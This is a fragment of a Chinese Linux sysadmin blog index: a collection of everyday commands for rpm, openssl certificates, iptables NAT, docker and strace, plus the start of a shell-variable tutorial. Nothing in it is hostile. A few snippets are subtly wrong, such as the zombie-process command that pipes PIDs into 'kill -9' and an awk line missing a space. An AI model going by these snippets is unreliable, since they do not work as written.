","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:16:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"linux 查看 rpm 包带的执行脚本 rpm -qp --scripts xxx.rpm ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:17:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"linux 自动安装 rpm 包依赖(dnf 默认已存在该功能) yum -y localinstall xxx.rpm ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:18:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"linux rpm 循环安装包依赖 # 关于循环安装是指的是主rpm包的所有的依赖包在同一目录下，会自动安装其依赖后在安装主rpm包，(此方法缺陷较大) rpm -ivh --aid *.rpm ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:19:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"清除僵死进程 ps -eal | awk '{ if ($2 == \"Z\") {print $4}}' | kill -9 ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:20:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"LNMP/LAMP 环境查看编译参数 # nginx /pathto/nginx/sbin/nginx -V # apache /pathto/apache/build/config.nice # mysql grep CONFIGURE_LINE /usr/bin/mysqlbug # php /pathto/php/bin/php -i|grep configure ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:21:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"让不同的进程使用不同的 cpu # taskset -c,--cpu-list command taskset -c 0,1,2,3 /etc/init.d/mysql start ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:22:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"watch 监测命令运行结果 # 类似tailf,但是针对命令 # 查看当前目录内容变化 # watch ls # watch \"netstat -ntu | awk '{print $5}' |cut -d: -f1|sort|uniq -c |sort -n\" ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:23:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"创建一个具有特定权限的空文件 #install -b -m \u003c权限\u003e \u003c来源\u003e \u003c目标\u003e install -b -m 777 /dev/null file.txt ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:24:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"创建一个具有特定权限的目录 # install -d -o \u003c用户名\u003e -g \u003c用户组\u003e -m \u003c权限\u003e \u003c目标地址\u003e install -d -o www -g www -m 755 /run/php-fpm ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:25:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"通过 sshfs 远程挂载目录 yum install sshfs # mount sshfs -o reconnect,_netdev,user,idmap=user,identityfile=/pathto/id_rsa,default_permissions user@host:/path /mnt/pathto # /etc/fstab user@host:/path /mnt/pathto fuse.sshfs noauto,x-systemd.automount,reconnect,_netdev,user,idmap=user,identityfile=/pathto/id_rsa,allow_other,default_permissions 0 0 ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:26:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"tmpfs 一种基于内存的文件系统 mount -t tmpfs -o size=1024M tmpfs /mnt/usb02 ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:27:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"文件描述符相关 点击展开详细内容 系统最大打开的文件描述符数量 cat /proc/sys/fs/file-nr 10848 0 6815744 # 第一个值: 当前系统已分配使用的打开文件描述符数 # 第二个值: 为分配后已释放的（目前已不再使用） # 第三个值: 等于/proc/sys/fs/file-max(打开的最大fd数量) 获取打开的文件数量 获取整个系统打开的文件数量 lsof | wc -l 获取某个用户打开的文件数量 lsof -u test |wc -l 获取某个程序打开的文件数量 for i in `pidof dotnet`; do lsof -p \"$i\" | wc -l ; done 获取某个程序打开的文件描述符数量 for i in `pidof dotnet` ; do echo -n \"$i : \"$(ll /proc/$i/fd|wc -l) done 查看系统里占用 fd 最多的进程 lsof -n | awk '{print $2}' | sort | uniq -c | sort -nr |head -n 10 #第一列是占用的fd数量，第二列是进程的pid ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:28:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"字符串拆分 echo \"hello\" |awk -F '' '{for(i=1;i\u003c=NF;i++)print $i}' #echo \"hello\" |awk '{split($0,a,\"''\");for(v in a)print a[v]}' ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:29:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"去除文本第一行和最后一行 seq 5 |awk'NR\u003e2{print s}{s=$0}' ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:30:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"查看当前主机类型 cat /sys/class/dmi/id/product_name ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:31:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"find 查看特定后缀的文件 # find ./ -regex \".*\\.tar.gz\\|.*\\.7z\" # find ./ -type f -regextype posix-extended -regex \".*\\.(tar.gz|7z)\" ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:32:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"shell 范围随机数 # echo $((RANDOM % (max - min) + min)) echo $((RANDOM % (99 - 80) + 80)) # shuf -i min-max -n 1 shuf -i 0-8 -n 1 ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:33:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"linux 将时间戳转换为时间 date +\"%F_%T\" -d$timestamp ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:34:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"linux 远程桌面连接 # freerdp-2.2.0-1.fc32.x86_64 xfreerdp /v:\u003chostip\u003e /u:\u003cusername\u003e /drive:shares,\u003c本地目录\u003e ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:35:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"linux 打包文件夹为 ISO 文件 mkisofs -o file.iso -J -R -V 01 file/ ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:36:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"Docker 与 iptables 只允许特定 ip 访问 Docker 的服务(DOCKER-USER) https://blog.csdn.net/Liv2005/article/details/112850208 https://docs.docker.com/network/iptables/ # 允许172.31.10.0/24网段访问docker网络，eth0 为服务器对外通信网卡 iptables -I DOCKER-USER -i eth0 ! -s 172.31.10.0/24 -j DROP ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:37:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"openssl 公钥提取 # 从证书中提取 openssl x509 -in domain.pem -pubkey -noout \u003e public.pem # 从私钥中提取 openssl rsa -in private.key -pubout \u003e public.pem ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:38:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"查看本地监听信息 cat /proc/net/tcp | grep \" 0A \" | sed 's/^[^:]*: \\(..\\)\\(..\\)\\(..\\)\\(..\\):\\(....\\).*/echo $((0x\\4)).$((0x\\3)).$((0x\\2)).$((0x\\1)):$((0x\\5))/g' | bash ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:39:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"获取 ping 域名的 ip ping www.baidu.com -c 1 -w 1 | sed '1{s/[^(]*(//;s/).*//;q}' ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:40:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"检查用户是否有操作 docker 权限 sudo -u zabbix curl --unix-socket /var/run/docker.sock --no-buffer -XGET v1.24/_ping ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:41:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"分段压缩 # 压缩 $\u003e tar czf - /pathto/dir01 /pathto/dir02 |split -d -b 2G - file.tgz. # 解压 $\u003e cat file.tgz* | tar xz # 压缩 $\u003e zip -s 100m -r myarchive.zip myfolder/ # 解压 $\u003e unzip myarchive.zip ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:42:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"临时移动工作路径执行命令 $\u003e (cd /some/other/dir \u0026\u0026 other-command) ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:43:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"mount –bind # 将 olddir 绑定到 newdir $\u003e mount -o bind olddir newdir # /etc/fstab # ro: 只读 rw: 只写 olddir newdir none defaults,ro,bind 0 0 # systemd # /etc/systemd/system/sftpdir-mnt.mount [Unit] SourcePath=/etc/fstab Documentation=man:fstab(5) man:systemd-fstab-generator(8) Before=local-fs.target [Mount] What=olddir Where=newdir Type=none Options=defaults,rw,bind [Install] WantedBy=multi-user.target ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:44:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"systemd 守护桌面程序 # 以最新的QQ Linux版 3.0.0 为例，fedora33 下经常崩溃，用systemd守护其运行，在QQ崩溃时自动重启QQ # 运行以下命令以启动systemd守护进程 $\u003e /usr/bin/systemd-run --property Restart=on-failure --user /opt/QQ/qq # 替换默认 /usr/share/applications/qq.desktop的执行命令 Exec=/usr/bin/systemd-run --property Restart=on-failure --user /opt/QQ/qq # 日志检查，可以定位当前用户的日志看(或者 systemctl --user list-units run-*|grep qq，查询到systemd-run启动的service，直接定位) $\u003e journalctl -f -u user@${UID}.service ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:45:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"证书相关操作 #CA合并 #厂商提供的cer文件，全部合并为后缀为pem的文件，并将域的cer放在文件最前面,crt 在后面 #nginx导入key和pem即可 ## 查看远程证书相关信息 $\u003e echo | openssl s_client -connect tools.example.com:443 2\u003e\u0026- | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' \u003e remote-cert.pem \\ \u0026\u0026 openssl x509 -in remote-cert.pem -text \\ \u0026\u0026 rm remote-cert.pem # 查看证书到期时间 # \u0026\u0026 openssl x509 -in remote-cert.pem -enddate -noout ## $\u003e openssl s_client -showcerts -connect tools.example.com:443 \u003c/dev/null | openssl x509 -inform PEM -noout -text ## CA证书取消密码 $\u003e openssl rsa -in \u003cca-private-key-file\u003e -out \u003cca-private-key-file\u003e.enc ## CA证书添加密码 $\u003e openssl rsa -des3 -in \u003cca-private-key-file\u003e -out \u003cca-private-key-file\u003e.enc # 证书生成 ## 创建ca私钥 $\u003e openssl genrsa -des3 -out ca.key 4096 ## 创建ca证书 ### /C=CN：证书持有者所在国家的两字母代码 ### /ST=CQ：证书持有者所在省/直辖市/自治区的名称或缩写 ### /O=example：证书持有者的组织或公司名称 ### /CN=example：证书持有者的通用名称（Common Name），一般为服务器的域名或客户端的用户名 ### /emailAddress=mail@example.com：证书持有者的电子邮件地址。 $\u003e openssl req -utf8 -x509 -new -nodes -key ca.key -sha512 -days 18250 -out ca.pem -subj \"/C=CN/ST=CQ/O=example/CN=example/emailAddress=mail@example.com\" # 创建服务器私钥 $\u003e openssl genrsa -out server.key 4096 # 创建域名csr $\u003e openssl req -new -key server.key -out server.csr -subj \"/C=CN/ST=CQ/O=0x5c0f/CN=example.com/emailAddress=mail@example.com\" # 创建扩展 $\u003e cat \u003e server.ext \u003c\u003cEOF authorityKeyIdentifier=keyid,issuer basicConstraints=CA:FALSE keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment extendedKeyUsage = serverAuth, clientAuth, codeSigning subjectAltName = @alt_names [alt_names] DNS.1 = *.example.com DNS.2 = *.example.cn DNS.3 = localhost IP.1 = 127.0.0.1 EOF # 生成域名证书 $\u003e openssl x509 -req -in server.csr -CA ca.pem -CAkey ca.key -CAcreateserial -out server.crt -days 1825 -sha512 -extfile server.ext ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:46:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"linux 端口转发 # linux 下端口转发 $\u003e echo 1 \u003e/proc/sys/net/ipv4/ip_forward $\u003e iptables -t nat -A POSTROUTING -j MASQUERADE $\u003e iptables -A FORWARD -i [内网网卡名称] -j ACCEPT $\u003e iptables -t nat -A POSTROUTING -s [内网网段] -o [外网网卡名称] -j MASQUERADE $\u003e iptables -t nat -A PREROUTING -p tcp -m tcp --dport [外网端口] -j DNAT --to-destination [内网地址]:[内网端口] ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:47:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"linux 下实现内网上公网 # 允许NAT功能和网络包的转发(eth0 为可以连接公网的网卡) $\u003e iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE # 允许从内网到公网的数据包转发 $\u003e sudo iptables -A FORWARD -i eth1 -o eth0 -j ACCEPT # sudo iptables -A FORWARD -i eth1 -s 10.0.2.33 -o eth0 -j ACCEPT # 允许已经建立连接的流量转发 $\u003e sudo iptables -A FORWARD -i eth0 -o eth1 -m state --state RELATED,ESTABLISHED -j ACCEPT # sudo iptables -A FORWARD -i eth0 -d 10.0.2.33 -o eth1 -m state --state RELATED,ESTABLISHED -j ACCEPT ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:48:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"linux 查询cpu占用过高的php-fpm进程,正在执行的php脚本或者处理的事 # 1. 通过top找到正在消耗 CPU 的 php-fpm 进程的 PID # 2. 使用 strace 命令跟踪该进程： $\u003e strace -p \u003cPID\u003e -e trace=open,execve,stat # 3. 在输出中查找正在执行的 PHP 脚本 $\u003e strace -p \u003cPID\u003e -e trace=open,execve,stat 2\u003e\u00261 | grep '\\.php' ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:49:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"查询当前目录下 md5 相同的文件 $\u003e find . -type f -exec md5sum {} + | sort | uniq -w32 -dD # uniq -w32 -dD：找到重复的MD5哈希，并只打印重复的行 ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:50:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"查询当前目录下 md5 等于某个值并删除/移动 # 删除 $\u003e find . -type f -exec md5sum {} + | grep 'your_md5_value' | cut -d ' ' -f 2- | xargs rm # 移动 $\u003e find . -type f -exec md5sum {} + | grep 'your_md5_value' | cut -d ' ' -f 2- | xargs -I {} mv {} /path/to/destination/ ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:51:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"通过 skopeo 命令查询 docker 仓库中特定容器存在那些版本，也可以用于管理 # 查询 $\u003e skopeo list-tags docker://hub.example.com/0x5c0f/sshx # 删除 $\u003e skopeo delete docker://hub.example.com/0x5c0f/sshx:2023121505 # ... ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:52:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"查询 docker 运行容器的 cpu 占用信息，并按照 cpu 占用排序 $\u003e watch -n 3 'docker stats --no-stream --format \"table {{.Name}}\\t{{.CPUPerc}}\" | sort -k 2 -r' ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:53:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"docker-compose 同时查询服务名、容器名、容器id # 需要 docker-compose v2 $\u003e docker compose ps --format \"table {{.Service}}:{{.Name}}\\t{{.ID}}\" ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:54:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"实时写入的大文件压缩切割 $\u003e gzip -c a.log \u003e/tmp/a.log.gz \u0026\u0026 \u003e a.log ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:55:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"将图片转化为指定大小，并且在图片高宽度不够时候，用透明背景填充 $\u003e ffmpeg -i input.(png|svg|..) -vf \"scale=944:944:force_original_aspect_ratio=decrease,pad=944:944:(944-iw)/2:(944-ih)/2:color=0x00000000\" output.png ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:56:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"Shellscript相关","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"1. shell 脚本执行的几种方法 bash(sh) /path/script.sh 赋予执行权限 /path/script.sh 或 ./scripts.sh source script.sh 或 . script.sh 在此方法中执行,子 shell 中定义的变量,可在父 shell 中调用(其他方式父 shell 不能直接调用子 shell 的变量) bash(sh) \u003c script.sh 或 cat script.sh | bash(sh) ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:1:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"2. shell 脚本规范 以 #!/bin/bash 或 #!/bin/sh 开头 注释标注, 作者、联系方式、时间、版本、脚本描述 脚本尽量不是使用中文注释 脚本以.sh 为扩展名 成对书写符号、条件控制语句等。如: []、{}、if []; then fi ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:2:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"3. 变量的设置与取消 设置 : 变量名=值 变量名一般大写 打印 : echo $变量名 取消 : unset 变量名 ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:3:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"4. 变量定义 ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:4:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"4.1. 普通变量定义 变量名=value 变量名='value' 变量名=\"value\" 变量名=$(ls) 变量名=`ls` ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:5:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"4.2. 变量名定义要求 变量名一般由字母、数字、下划线组成 ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:6:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"4.3. 示例 a=123 b=123-$a ## 当值没有单(双)引号的时候,变量的值为 123-变量 a 的值,若变量值出现空格，则值为第一个空格之前的数据 c='123-$a' ## 当值存在单引号的时候,值为什么，打印结果则为什么，引号内内容视为一个整体 d=\"123-$a\" ## 当值为双引号的时候,若值中存在变量、命令(需要转义)等，会优先把变量、命令结果输出,在打印所有值 ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:7:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"5. 特殊、内置变量 变量名 说明 $0 获取当前执行脚本的名称,如果执行脚本带有路径,则包含脚本路径 $n 获取当前执行脚本的第 n 个参数,n=1-9，n 为 0 时,表示脚本文件名,如果 n 大于 9,用大括号括起来${10},参数以空格隔开 $* 获取当前脚本所有传入的参数,将所有的参数视为单个字符串,相当于\"$1$2$3\"… $# 获取当前脚本传入参数的个数总数 $@ 